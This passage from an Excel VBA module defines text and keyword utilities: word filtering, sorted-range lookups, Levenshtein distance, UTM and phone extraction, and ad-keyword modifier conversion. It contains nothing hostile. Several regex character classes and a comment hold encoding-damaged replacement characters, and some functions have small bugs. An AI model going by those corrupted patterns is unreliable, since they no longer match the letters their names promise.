exOnWords = WStrim(Join(arr, " "))
End Function
Private Function exOnWords2(fnname As String, x As String, y As String) As String
Dim arr() As String, i As Long
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    arr(i) = Application.Run(fnname, CStr(arr(i)), y)
Next i
exOnWords2 = WStrim(Join(arr, " "))
End Function
Private Function exOnWords2ParamsRng(fnname As String, x As String, rng As Range) As String
Dim arr() As String, i As Long
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    arr(i) = Application.Run(fnname, CStr(arr(i)), rng)
Next i
exOnWords2ParamsRng = WStrim(Join(arr, " "))
End Function
Private Function vOnWords(fnname As String, x As String) As Boolean
Dim arr() As String, i As Long
arr = Split(x & " ")
vOnWords = False
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i))) = True Then
        vOnWords = True
        Exit For
    End If
Next i
End Function
Private Function cVWords(fnname As String, x As String) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i))) = True Then
    Else:
    arr(i) = ""
    End If
Next i
cVWords = WStrim(Join(arr, " "))
End Function
Private Function dVWords(fnname As String, x As String) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i))) = True Then
    arr(i) = ""
    End If
Next i
dVWords = WStrim(Join(arr, " "))
End Function
Private Function capVWords(fnname As String, x As String) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i))) = True Then
    arr(i) = StrConv(arr(i), vbProperCase)
    End If
Next i
capVWords = WStrim(Join(arr, " "))
End Function
Private Function UCaseVWords(fnname As String, x As String) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i))) = True Then
    arr(i) = UCase(arr(i))
    End If
Next i
UCaseVWords = WStrim(Join(arr, " "))
End Function
Private Function vOnWords2PL(fnname As String, x As String, y As Long) As Boolean
Dim arr() As String, i As Long
arr = Split(x & " ")
vOnWords2PL = False
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), y) = True Then
        vOnWords2PL = True
        Exit For
    End If
Next i
End Function
Private Function vOnWords2PS(fnname As String, x As String, y As String) As Boolean
Dim arr() As String, i As Long
arr = Split(x & " ")
vOnWords2PS = False
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), y) = True Then
        vOnWords2PS = True
        Exit For
    End If
Next i
End Function
Private Function vOnWords2PRng(fnname As String, x As String, rng As Range) As Boolean
Dim arr() As String, i As Long
arr = Split(x & " ")
vOnWords2PRng = False
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), rng) = True Then
        vOnWords2PRng = True
        Exit For
    End If
Next i
End Function
Private Function vNegOnWords2PRng(fnname As String, x As String, rng As Range) As Boolean
Dim arr() As String, i As Long
arr = Split(x & " ")
vNegOnWords2PRng = False
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), rng) = False Then
        vNegOnWords2PRng = True
        Exit For
    End If
Next i
End Function
Private Function cVWords2(fnname As String, x As String, y As String) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), y) = True Then
    Else:
    arr(i) = ""
    End If
Next i
cVWords2 = WStrim(Join(arr, " "))
End Function
Private Function cVWords2ParamsRng(fnname As String, x As String, rng As Range) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), rng) = True Then
    Else:
    arr(i) = ""
    End If
Next i
cVWords2ParamsRng = WStrim(Join(arr, " "))
End Function
Private Function dVWords2(fnname As String, x As String, y As String) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), y) = True Then
    arr(i) = ""
    End If
Next i
dVWords2 = WStrim(Join(arr, " "))
End Function
Private Function dVWords2ParamsRng(fnname As String, x As String, rng As Range) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), rng) = True Then
    arr(i) = ""
    End If
Next i
dVWords2ParamsRng = WStrim(Join(arr, " "))
End Function
Private Function moveValidWordToBeg(fnname As String, x As String) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i))) = True Then
    arr(0) = arr(i) & " " & arr(0)
    arr(i) = ""
    End If
Next i
moveValidWordToBeg = WStrim(Join(arr, " "))
End Function
Private Function moveValidWordToBeg2ParamsRng(fnname As String, x As String, rng As Range) As String
Dim i As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) + 1 To UBound(arr)
    If Application.Run(fnname, CStr(arr(i)), rng) = True Then
    arr(0) = arr(i) & " " & arr(0)
    arr(i) = ""
    End If
Next i
moveValidWordToBeg2ParamsRng = WStrim(Join(arr, " "))
End Function
Private Function moveWordsToBeg(x As String, rng As Range) As String
moveWordsToBeg = moveValidWordToBeg2ParamsRng("binSearchBUC", x, rng)
End Function
Private Function moveValidWordToEnd(fnname As String, x As String) As String
Dim i As Long, ub As Long
Dim arr() As String
arr = Split(x & " ")
For i = LBound(arr) To UBound(arr)
    If Application.Run(fnname, CStr(arr(i))) = True Then
    arr(ub) = arr(ub) & " " & arr(i)
    arr(i) = ""
    End If
Next i
moveValidWordToEnd = WStrim(Join(arr, " "))
End Function
Private Function moveValidWordToEnd2ParamsRng(fnname As String, x As String, rng As Range) As String
Dim i As Long, ub As Long
Dim arr() As String
arr = Split(x & " ")
ub = UBound(arr)
For i = LBound(arr) To UBound(arr) - 1
    If Application.Run(fnname, CStr(arr(i)), rng) = True Then
    arr(ub) = arr(ub) & " " & arr(i)
    arr(i) = ""
    End If
Next i
moveValidWordToEnd2ParamsRng = WStrim(Join(arr, " "))
End Function
Private Function moveWordsToEnd(x As String, rng As Range) As String
moveWordsToEnd = moveValidWordToEnd2ParamsRng("binSearchBUC", x, rng)
End Function
Private Function dWVOnAnyFromList(fnname As String, strArg As String, rng As Range) As String
Dim strArr() As String, arr(), i As Long, j As Long
arr = rng.Value2
strArr = Split(strArg, " ")
    For j = LBound(strArr) To UBound(strArr)
        For i = LBound(arr) To UBound(arr)
            If Application.Run(fnname, strArr(j), CStr(arr(i, 1))) = True Then
            strArr(j) = ""
            Exit For
            Else:
            End If
        Next i
    Next j
dWVOnAnyFromList = WStrim(Join(strArr, " "))
End Function
Private Function extrWVOnAnyFromList(fnname As String, strArg As String, rng As Range) As String
Dim strArr() As String, arr(), i As Long, j As Long, check As Boolean
arr = rng.Value2
strArr = Split(strArg, " ")
    For j = LBound(strArr) To UBound(strArr)
        For i = LBound(arr) To UBound(arr)
            check = False
            If Application.Run(fnname, strArr(j), CStr(arr(i, 1))) = True Then
                check = True
                Exit For
            Else:
                End If
        Next i
            If check = False Then strArr(j) = ""
    Next j
extrWVOnAnyFromList = WStrim(Join(strArr, " "))
End Function
Private Function extrPatternsFromList(x As String, rng As Range, matchType As String, Optional All As Boolean = False) As String
Dim strArr() As String, arr(), i As Long, j As Long, check As Boolean, z As Long
arr = rng.Value2
strArr = Split(x, " ")
If All = False Then
    If matchType = "begin" Then
        For j = LBound(strArr) To UBound(strArr)
            For i = LBound(arr) To UBound(arr)
                check = False
                If startsWith(strArr(j), CStr(arr(i, 1))) Then
                    check = True
                    strArr(j) = CStr(arr(i, 1))
                    Exit For
                Else:
                    End If
            Next i
                If check = False Then strArr(j) = ""
        Next j
    ElseIf matchType = "end" Then
        For j = LBound(strArr) To UBound(strArr)
            For i = LBound(arr) To UBound(arr)
                check = False
                If endsWith(strArr(j), CStr(arr(i, 1))) Then
                    check = True
                    strArr(j) = CStr(arr(i, 1))
                    Exit For
                Else:
                    End If
            Next i
                If check = False Then strArr(j) = ""
        Next j
    ElseIf matchType = "contain" Then
        For j = LBound(strArr) To UBound(strArr)
            For i = LBound(arr) To UBound(arr)
                check = False
                If contP(strArr(j), CStr(arr(i, 1))) Then
                    check = True
                    strArr(j) = CStr(arr(i, 1))
                    Exit For
                Else:
                    End If
            Next i
                If check = False Then strArr(j) = ""
        Next j
    Else:
    End If
'|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| -------------------------------------------------------------------
Else:
    If matchType = "begin" Then
        For j = LBound(strArr) To UBound(strArr)
            z = Len(strArr(j))
            For i = LBound(arr) To UBound(arr)
                If startsWith(strArr(j), CStr(arr(i, 1))) Then
                    strArr(j) = strArr(j) & " " & CStr(arr(i, 1))
                Else:
                    End If
            Next i
        strArr(j) = WStrim(Right(strArr(j), Len(strArr(j)) - z))
        Next j
    ElseIf matchType = "end" Then
        For j = LBound(strArr) To UBound(strArr)
            z = Len(strArr(j))
            For i = LBound(arr) To UBound(arr)
                If endsWith(strArr(j), CStr(arr(i, 1))) Then
                    strArr(j) = CStr(arr(i, 1)) & " " & strArr(j)
                Else:
                    End If
            Next i
        strArr(j) = WStrim(Left(strArr(j), Len(strArr(j)) - z))
        Next j
    ElseIf matchType = "contain" Then
        For j = LBound(strArr) To UBound(strArr)
            z = Len(strArr(j))
            For i = LBound(arr) To UBound(arr)
                If contP(strArr(j), CStr(arr(i, 1))) Then
                    strArr(j) = CStr(arr(i, 1)) & " " & strArr(j)
                Else:
                    End If
            Next i
        strArr(j) = WStrim(Left(strArr(j), Len(strArr(j)) - z))
        Next j
    Else:
    End If
End If
extrPatternsFromList = WStrim(Join(strArr, " "))
End Function
Private Function extrPrefixes(x As String, rng As Range)
extrPrefixes = extrPatternsFromList(x, rng, "begin")
End Function
Private Function extrSuffixes(x As String, rng As Range)
extrSuffixes = extrPatternsFromList(x, rng, "end")
End Function
Private Function extrPatterns(x As String, rng As Range)
extrPatterns = extrPatternsFromList(x, rng, "contain")
End Function
Private Function extrPrefixesAll(x As String, rng As Range)
extrPrefixesAll = extrPatternsFromList(x, rng, "begin", True)
End Function
Private Function extrSuffixesAll(x As String, rng As Range)
extrSuffixesAll = extrPatternsFromList(x, rng, "end", True)
End Function
Private Function extrPatternsAll(x As String, rng As Range)
extrPatternsAll = extrPatternsFromList(x, rng, "contain", True)
End Function
Private Function WStrim(x) As String
WStrim = Application.WorksheetFunction.Trim(x)
End Function
' c o m m o n, d i f f e r
Private Function vbMin(n1, n2) As Long
vbMin = IIf(n1 < n2, n1, n2)
End Function
Private Function CommonSubString(S1 As String, s2 As String) As String
Dim i As Long, sim As String
For i = 1 To vbMin(Len(S1), Len(s2))
    sim = Left(S1, i)
    If sim = Left(s2, i) Then CommonSubString = sim Else Exit For
Next i
End Function
Private Function WordDiff(S1 As String, s2 As String) As Long
Dim arr() As String, s1s2 As String, i As Long, a As Long
s1s2 = sortInCellAZ(WStrim(S1) & " " & WStrim(s2))
arr = Split(" " & s1s2 & " ", " ")
For i = LBound(arr) + 1 To UBound(arr) - 1:
    If arr(i) <> arr(i - 1) And arr(i) <> arr(i + 1) Then a = a + 1
Next i
WordDiff = a
End Function
Private Function distinctWords(S1 As String, s2 As String) As String
Dim arr() As String, s1s2 As String, i As Long, a As String
s1s2 = sortInCellAZ(WStrim(S1) & " " & WStrim(s2))
arr = Split(" " & s1s2 & " ", " ")
a = ""
For i = LBound(arr) + 1 To UBound(arr) - 1:
    If arr(i) <> arr(i - 1) And arr(i) <> arr(i + 1) Then a = a & " " & arr(i)
Next i
distinctWords = a
End Function
Function Levenstein(ByVal string1 As String, ByVal string2 As String) As Long
  Dim i As Long, j As Long, bs1() As Byte, bs2() As Byte, str1_l As Long
  Dim str2_l As Long
  Dim Distance() As Long
  Dim min1 As Long, min2 As Long, min3 As Long
  str1_l = Len(string1)
  str2_l = Len(string2)
  ReDim Distance(str1_l, str2_l)
  bs1 = string1
  bs2 = string2
  For i = 0 To str1_l
      Distance(i, 0) = i
  Next
  For j = 0 To str2_l
      Distance(0, j) = j
  Next
  For i = 1 To str1_l
      For j = 1 To str2_l
          If bs1((i - 1) * 2) = bs2((j - 1) * 2) Then
              Distance(i, j) = Distance(i - 1, j - 1)
          Else
              min1 = Distance(i - 1, j) + 1
              min2 = Distance(i, j - 1) + 1
              min3 = Distance(i - 1, j - 1) + 1
              If min1 <= min2 And min1 <= min3 Then
                  Distance(i, j) = min1
              ElseIf min2 <= min1 And min2 <= min3 Then
                  Distance(i, j) = min2
              Else
                  Distance(i, j) = min3
              End If
          End If
      Next
  Next
  Levenstein = Distance(str1_l, str2_l)
End Function
'------------
Function IsInArray(valToBeFound As Variant, arr As Variant) As Boolean
Dim element As Variant
On Error GoTo IsInArrayError:
    For Each element In arr
        If element = valToBeFound Then
            IsInArray = True
            Exit Function
        End If
    Next element
Exit Function
IsInArrayError:
On Error GoTo 0
IsInArray = False
End Function
Private Function binSearchB(a As String, b As Range) As Boolean
binSearchB = False
Err.Clear
On Error Resume Next
If Application.VLookup(CStr(a), b.Columns(1), 1, True) = a Then
    binSearchB = True
Else:
    binSearchB = False
End If
If Err > 0 Then binSearchB = False
End Function
Private Function binSearchBUC(a As String, b As Range) As Boolean
binSearchBUC = False
Err.Clear
On Error Resume Next
If Application.VLookup(UCase$(a), b.Columns(1), 1, True) = UCase$(a) Then
    binSearchBUC = True
Else:
    binSearchBUC = False
End If
If Err > 0 Then binSearchBUC = False
End Function
Private Function binSearch(a As String, b As Range, c As Long) As String
On Error Resume Next
Err.Clear
If Application.VLookup(a, b.Columns(1), 1, True) = a Then
    binSearch = Application.VLookup(a, b, c, True)
Else
    binSearch = a
End If
If Err <> 0 Then binSearch = a
End Function
Private Function binSearchUC(a As String, b As Range, c As Long) As String
On Error Resume Next
Err.Clear
If Application.VLookup(UCase(a), b.Columns(1), 1, True) = UCase(a) Then
    binSearchUC = Application.VLookup(UCase(a), b, c, True)
Else
    binSearchUC = a
End If
If Err <> 0 Then binSearchUC = a
End Function
Private Function VlookupSorted2CUC(a As String, b As Range) As String
On Error Resume Next
If Application.VLookup(UCase(a), b.Columns(1), 1, True) = UCase(a) Then
    VlookupSorted2CUC = Application.VLookup(UCase(a), b, 2, True)
Else
    VlookupSorted2CUC = ""
End If
If Err <> 0 Then
    Err.Clear
    VlookupSorted2CUC = ""
End If
End Function
Private Function VlookupSorted2CSoft(a As String, b As Range) As String
On Error Resume Next
Err.Clear
If Application.VLookup(a, b.Columns(1), 1, True) = a Then
    VlookupSorted2CSoft = Application.VLookup(a, b, 2, True)
Else
    VlookupSorted2CSoft = a
End If
If Err <> 0 Then VlookupSorted2CSoft = a
End Function
Private Function binSearchProperiseUC(a As String, b As Range) As String
On Error Resume Next
Err.Clear
If Application.VLookup(UCase(a), b.Columns(1), 1, True) = UCase(a) Then
    binSearchProperiseUC = StrConv(a, vbProperCase)
Else
    binSearchProperiseUC = a
End If
If Err <> 0 Then binSearchProperiseUC = a
End Function
Private Function binSearchCapsUC(a As String, b As Range) As String
On Error Resume Next
Err.Clear
If Application.VLookup(UCase$(a), b.Columns(1), 1, True) = UCase$(a) Then
    binSearchCapsUC = UCase$(a)
Else
    binSearchCapsUC = a
End If
If Err <> 0 Then binSearchCapsUC = a
End Function
Private Function capWordList(x As String, rng As Range)
capWordList = exOnWords2ParamsRng("binSearchProperiseUC", x, rng)
End Function
Private Function capsWordList(x As String, rng As Range)
capsWordList = exOnWords2ParamsRng("binSearchCapsUC", x, rng)
End Function
Private Function binSearchBoF(a As String, b As Range) As String
On Error Resume Next
Err.Clear
If Application.VLookup(a, b.Columns(1), 1, True) = a Then
    binSearchBoF = ""
Else
    binSearchBoF = a
End If
If Err <> 0 Then binSearchBoF = a
End Function
Private Function binSearchBoFUC(a As String, b As Range) As String
On Error Resume Next
Err.Clear
If Application.VLookup(UCase(a), b.Columns(1), 1, True) = UCase(a) Then
    binSearchBoFUC = ""
Else
    binSearchBoFUC = a
End If
If Err <> 0 Then binSearchBoFUC = a
End Function
Private Function VlookupSorted2C(a As String, b As Range) As String
On Error Resume Next
Err.Clear
If Application.VLookup(a, b.Columns(1), 1, True) = a Then
    VlookupSorted2C = Application.VLookup(a, b, 2, True)
Else
    VlookupSorted2C = ""
End If
If Err <> 0 Then VlookupSorted2C = ""
End Function
Private Function VlookupSorted2CSoftUC(a As String, b As Range) As String
On Error Resume Next
Err.Clear
If Application.VLookup(UCase(a), b.Columns(1), 1, True) = UCase(a) Then
    VlookupSorted2CSoftUC = Application.VLookup(UCase(a), b, 2, True)
Else
    VlookupSorted2CSoftUC = a
End If
If Err <> 0 Then VlookupSorted2CSoftUC = a
End Function
Function delWordsFromRng(a As String, b As Range) As String
delWordsFromRng = dVWords2ParamsRng("binSearchB", a, b)
End Function
'''''
Private Function containsWord(x As String, w As String) As Boolean
containsWord = contP(" " & x & " ", " " & w & " ")
End Function
Private Function notContainsWord(x As String, w As String) As Boolean
notContainsWord = Not containsWord(x, w)
End Function
Private Function clIfContW(x As String, s As String) As String
clIfContW = remV2PS("containsWord", x, s)
End Function
Private Function extrIfContW(x As String, s As String) As String
extrIfContW = extrV2PS("containsWord", x, s)
End Function
Private Function fullMatch(x As String, p As String) As Boolean
If UCase(x) = UCase(p) Then fullMatch = True Else fullMatch = False
End Function
Private Function delWordsFullMatch(x As String, p As String)
delWordsFullMatch = dVWords2("fullMatch", x, p)
End Function
Private Function extrWordsFullMatch(x As String, p As String)
extrWordsFullMatch = cVWords2("fullMatch", x, p)
End Function
Private Function contP(x As String, p As String) As Boolean
If InStr(1, UCase(x), UCase(p)) > 0 Then contP = True Else contP = False
End Function
Private Function delWordsContaining(x As String, p As String)
delWordsContaining = dVWords2("contP", x, p)
End Function
Private Function delWordsContainingAnyFromRng(x As String, rng As Range)
delWordsContainingAnyFromRng = dWVOnAnyFromList("contP", x, rng)
End Function
Private Function contPsFromListAny(x As String, rng As Range) As Boolean
contPsFromListAny = vOnAnyFromList("contP", x, rng)
End Function
Private Function clIfContPLst(x As String, rng As Range) As String
clIfContPLst = remV2PRng("contPsFromListAny", x, rng)
End Function
Private Function extrIfContPLst(x As String, rng As Range) As String
extrIfContPLst = extrV2PRng("contPsFromListAny", x, rng)
End Function
Private Function contPsFromListAll(x As String, rng As Range) As Boolean
contPsFromListAll = vOnAllFromList("contP", x, rng)
End Function
Private Function hasAnyWordsFromSortedList(x As String, rng As Range) As Boolean
hasAnyWordsFromSortedList = vOnWords2PRng("binSearchBUC", x, rng)
End Function
Private Function hasAnyWordsFromSortedListCaseSen(x As String, rng As Range) As Boolean
hasAnyWordsFromSortedListCaseSen = vOnWords2PRng("binSearchB", x, rng)
End Function
Private Function hasAnyWordsNotFromSortedListCaseSen(x As String, rng As Range) As Boolean
hasAnyWordsNotFromSortedListCaseSen = vNegOnWords2PRng("binSearchB", x, rng)
End Function
Private Function hasNoWordsFromSortedList(x As String, rng As Range) As Boolean
hasNoWordsFromSortedList = Not vOnWords2PRng("binSearchBUC", x, rng)
End Function
Private Function clIfContWordLst(x As String, rng As Range) As String
clIfContWordLst = remV2PRng("hasAnyWordsFromSortedList", x, rng)
End Function
Private Function extrIfContWordLst(x As String, rng As Range) As String
extrIfContWordLst = extrV2PRng("hasAnyWordsFromSortedList", x, rng)
End Function
'dodelat
Private Function containsWordsFromListAll(x As String, rng As Range) As Boolean
containsWordsFromListAll = vOnAllFromList("containsWord", x, rng)
End Function

Private Function VlookupWordsFromRng(x As String, rng As Range) As String
VlookupWordsFromRng = exOnWords2ParamsRng("VlookupSorted2C", x, rng)
End Function
Private Function replWordsFromRng(x As String, rng As Range) As String
replWordsFromRng = exOnWords2ParamsRng("VlookupSorted2CSoft", x, rng)
End Function
Private Function extrWordsIfContPList(x As String, rng As Range)
extrWordsIfContPList = exOnWords2ParamsRng("extrIfContPLst", x, rng)
End Function
Function replSubStrings(x As String, rng As Range) As String
Dim arr(), i As Long
arr = rng.Value2
replSubStrings = x
For i = LBound(arr) To UBound(arr)
If InStr(1, UCase(replSubStrings), UCase(CStr(arr(i, 1)))) > 0 Then replSubStrings = Replace(replSubStrings, CStr(arr(i, 1)), arr(i, 2), vbTextCompare)
Next i
End Function

Private Function findRepWords(s As String) As Boolean
Dim x() As String, i As Long, j As Long
findRepWords = False
If InStr(1, s, " ") = 0 Then Exit Function
x = Split(UCase$(s), " ")
For i = LBound(x) To UBound(x) - 1
    For j = i + 1 To UBound(x)
        If x(i) = x(j) Then
        findRepWords = True
        Exit Function
        End If
    Next j
Next i
End Function
Private Function remRepWords(x As String) As String
Dim a() As String, b() As String, i As Long, j As Long, k As Long
a = Split(UCase$(x), " ")
b = Split(x, " ")
k = UBound(a)
For i = LBound(a) To k - 1
    For j = i + 1 To k
        If a(i) = a(j) Then
        b(j) = ""
        End If
    Next j
Next i
remRepWords = WStrim(Join(b, " "))
End Function
Private Function remRepWordsInclMorphs(x As String) As String
Dim a() As String, b() As String, i As Long, j As Long, k As Long
a = Split(UCase$(Lemmatize(CStr(LCase(x)))), " ")
b = Split(x, " ")
k = UBound(a)
For i = LBound(a) To k - 1
    For j = i + 1 To k
        If a(i) = a(j) Then
        b(j) = ""
        End If
    Next j
Next i
remRepWordsInclMorphs = WStrim(Join(b, " "))
End Function
Private Function countUniqueWords(x As String)
countUniqueWords = slov(remRepWords(x))
End Function
Private Function insertBefore(x As String, s As String) As String
insertBefore = s & x
End Function
Private Function insertAfter(x As String, s As String) As String
insertAfter = x & s
End Function
Private Function wrapByString(x As String, s As String) As String
wrapByString = s & x & s
End Function
Private Function wrapBy2Strings(x As String, y As String, z As String) As String
wrapBy2Strings = y & x & z
End Function
Private Function ReverseString(r As String) As String
ReverseString = StrReverse(r)
End Function
Private Function slov(x As String) As Long
Dim a() As String
a = Split(x, " ", -1, vbBinaryCompare)
slov = UBound(a) + 1
Erase a
End Function
Private Function symLen(x)
symLen = Len(x)
End Function
Private Function lowercase(x As String) As String
lowercase = LCase$(x)
End Function
Private Function vkavychki(x) As String
If Len(x) > 0 Then vkavychki = """" & x & """" Else vkavychki = ""
End Function
Private Function sqBr(x) As String
If Len(x) > 0 Then sqBr = "[" & x & "]" Else sqBr = ""
End Function
Private Function frazovoyeslovoformy(x) As String
If Len(x) > 0 Then frazovoyeslovoformy = "[" & zakryepitslovoformy(x) & "]" Else frazovoyeslovoformy = ""
End Function
Private Function zakryepitslovoformy(x) As String
Dim arrtemp() As String
arrtemp = Split(WStrim(x), " ")
zakryepitslovoformy = "!" & Join(arrtemp, " !")
End Function
Private Function blankToZero(s) As Variant
If s = "" Then blankToZero = 0 Else blankToZero = s
End Function
Private Function tochnoyesoslovoformami(x) As String
Dim arrtemp() As String
arrtemp = Split(WStrim(CStr(x)), " ")
tochnoyesoslovoformami = """!" & Join(arrtemp, " !") & """"
End Function
Private Function svyerkhtochnoye(x) As String
Dim arrtemp() As String
arrtemp = Split(WStrim(CStr(x)), " ")
svyerkhtochnoye = """[!" & Join(arrtemp, " !") & "]"""
End Function
Private Function insertBeforeWords(x As String, m As String)
insertBeforeWords = exOnWords2("insertBefore", x, m)
End Function
Private Function insertAfterWords(x As String, m As String)
insertAfterWords = exOnWords2("insertAfter", x, m)
End Function
Private Function remMdf(x As String) As String
Dim remsym()
remsym = Array("+", "!", "[", "]", """")
remMdf = x
For i = LBound(remsym) To UBound(remsym)
    If InStr(1, x, remsym(i)) > 0 Then remMdf = Replace(remMdf, remsym(i), "")
Next i
End Function
Private Function KWD_YDtoGA(x) As String
If Left(x, 1) = """" Then
    KWD_YDtoGA = sqBr(remMdf(CStr(x)))
ElseIf Left(x, 1) = "[" Then
    KWD_YDtoGA = vkavychki(remMdf(CStr(x)))
Else:
    KWD_YDtoGA = prostavitmodifikatory(remMdf(CStr(x)))
End If
End Function
Private Function SentenceCase(rng As String) As String
Dim a() As String, i As Long
a = Split(Replace(Replace(Replace(rng, "! ", "! \", , , vbBinaryCompare), ". ", ". \", , , vbBinaryCompare), "? ", "? \", , , vbBinaryCompare), "\", , vbBinaryCompare)
For i = LBound(a) To UBound(a)
    x = x & UCase$(Left(a(i), 1)) & Mid$(a(i), 2)
Next i
SentenceCase = x
End Function
Private Function unSentenceCase(rng As String) As String
Dim a() As String, i As Long
a = Split(Replace(Replace(Replace(rng, "! ", "! \", , , vbBinaryCompare), ". ", ". \", , , vbBinaryCompare), "? ", "? \", , , vbBinaryCompare), "\", , vbBinaryCompare)
For i = LBound(a) To UBound(a)
    x = x & LCase$(Left(a(i), 1)) & Mid$(a(i), 2)
Next i
unSentenceCase = x
End Function
Private Function extrREFirst(x As String, p As String) As String
extrREFirst = rgxExtract(x, p, False)
End Function
Private Function extrREAll(x As String, p As String, Optional delim As String = "") As String
extrREAll = rgxExtract(x, p, True, delim)
End Function
Private Function extrREPhone(x As String) As String
Dim p1 As String, p2 As String
p1 = WorksheetFunction.IfError(rgxExtract(x, "\b(\+?(7|8)?\D*?\d{3}\D*?\d{3}\D*?\d{2}\D*?\d{2})\b"), "")
p2 = WorksheetFunction.IfError(rgxExtract(x, "\b(\+?(7|8)?\D*?\d{3}\D*?\d{3}\D*?\d{1}\D*?\d{3})\b"), "")
If Len(p1) > Len(p2) Then extrREPhone = "\" & p1 Else extrREPhone = "\" & p2
End Function
Private Function rgxExtract(x As String, p As String, Optional Globa1 As Boolean = True, Optional delim As String = "") As String
Dim rgx As Object, i As Variant
Set rgx = CreateObject("VBScript.RegExp")
rgxExtract = ""
rgx.pattern = p
rgx.Global = Globa1
rgx.IgnoreCase = IgnoreCase
Set output = rgx.Execute(x)
For Each i In output
rgxExtract = rgxExtract & i.Value & delim
Next i
If rgxExtract <> "" Then rgxExtract = Left(rgxExtract, Len(rgxExtract) - Len(delim))
End Function
Private Function rgxReplace(str As String, pattern As String, _
Replace As String, Optional Globa1 As Boolean = True, Optional IgnoreCase As Boolean = False, _
Optional Multiline As Boolean = False) As String
rgxReplace = str
If Not str Like "" And Not pattern Like "" Then
Dim RegExp As Object
Set RegExp = CreateObject("VBScript.RegExp")
With RegExp
.Global = Globa1
.IgnoreCase = IgnoreCase
.Multiline = Multiline
.pattern = pattern
End With
On Error Resume Next
rgxReplace = RegExp.Replace(str, Replace)
Set RegExp = Nothing
End If
End Function
Private Function rgxRem(x As String, p As String) As String
rgxRem = rgxReplace(x, p, "")
End Function
Private Function rgxRemAllExcept(x As String, p As String) As String
rgxRemAllExcept = rgxExtract(x, p)
End Function
Private Function extrSource(x As String) As String
On Error Resume Next
extrSource = rgxExtract(x, "utm_source=[^$#&]+")
If extrSource = Null Then extrSource = ""
End Function
Private Function extrMedium(x As String) As String
On Error Resume Next
extrMedium = rgxExtract(x, "utm_medium=[^$#&]+")
If extrMedium = Null Then extrMedium = ""
End Function
Private Function extrCampaign(x As String) As String
On Error Resume Next
extrCampaign = rgxExtract(x, "utm_campaign=[^$#&]+")
If extrCampaign = Null Then extrCampaign = ""
End Function
Private Function extrTerm(x As String) As String
On Error Resume Next
extrTerm = rgxExtract(x, "utm_term=[^$#&]+")
If extrTerm = Null Then extrTerm = ""
End Function
Private Function extrContent(x As String) As String
On Error Resume Next
extrContent = rgxExtract(x, "utm_content=[^$#&]+")
If extrContent = Null Then extrContent = ""
End Function
Private Function replFirstOcc(x As String, p As String, r As String) As String
i = InStr(1, x, p)
If i > 0 Then replFirstOcc = Left(x, i - 1) & r & Right(x, Len(x) - i + 1 - Len(p))
End Function
Private Function extrWChars(r As String) As String
extrWChars = WStrim(rgxReplace(CStr(r), "[=\.\\'&|fffd|,\(\)/#\-|fffd|!\*:|fffd|@+|fffd||fffd||fffd|;\||fffd||fffd||fffd|\[\]\~$%\^_|fffd|""""\?><\{\}0-9]", " "))
End Function
Private Function removePunctuation(r As String) As String
removePunctuation = WStrim(rgxReplace(CStr(r), "[=\.\\'&|fffd|,\(\)/#\-|fffd|!\*:|fffd|@+|fffd||fffd||fffd|;\||fffd||fffd||fffd|\[\]\~$%\^_|fffd|""""\?><\{\}]", " "))
End Function
Private Function extrCyr(r As String) As String
extrCyr = WStrim(rgxExtract(CStr(r), "[\u0410-\u04FF\u0401\u0451|fffd||fffd|\s]"))
End Function
Private Function extrLatin(r As String) As String
extrLatin = WStrim(rgxExtract(CStr(r), "[a-zA-Z\s]"))
End Function
Private Function extrES(r As String) As String
extrES = WStrim(rgxExtract(CStr(r), "[a-zA-Z|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]"))
End Function
Private Function extrFR(r As String) As String
extrFR = WStrim(rgxExtract(CStr(r), "[a-zA-Z|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||39f||fffd||fffd||fffd||fffd||18c|]"))
End Function
Private Function extrGE(r As String) As String
extrGE = WStrim(rgxExtract(CStr(r), "[a-zA-Z|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\u1E9E]"))
End Function
Private Function extrIT(r As String) As String
extrIT = WStrim(rgxExtract(CStr(r), "[a-zA-Z|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]"))
End Function
Private Function extrJP(r As String) As String
extrJP = WStrim(rgxExtract(CStr(r), "[\u4e00-\u9fbf\u3040-\u309f\u30a0-\u30ff]"))
End Function
Private Function extrDigits(r As String) As String
